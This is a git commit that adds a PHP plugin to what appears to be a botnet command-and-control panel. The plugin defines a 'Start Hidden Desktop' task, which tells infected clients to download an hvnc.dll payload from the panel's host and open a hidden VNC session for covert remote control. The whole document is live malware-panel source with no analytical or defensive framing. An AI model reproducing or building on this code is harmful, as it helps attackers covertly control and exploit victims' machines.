f9669dfe1e05ef35b7558bbf2d111cc54065237e
darkspiderbots <lenna15h08elli@gmail.com>
2019-09-01 16:37:30 +0200

    Added HVNC Task

---
+++ versions/2.0/plugins/hvnc/hvnc.php
@@ -0,0 +1,14 @@
+<?php
+
+
+$pluginName = "hvnc";
+
+$GLOBALS["foundPlugins"][$pluginName]["plugindir"] = __DIR__;
+
+$host = "http://".$_SERVER["HTTP_HOST"];
+
+$GLOBALS["task_configuration"][$pluginName] = array(
+    "name" => "Start Hidden Desktop",
+    "command" => "hvnc",
+    "value" => $host."/versions/".$GLOBALS["loadedVersion"]."/plugins/".$pluginName."/dll/hvnc.dll;hvnc;127.0.0.1"
+);
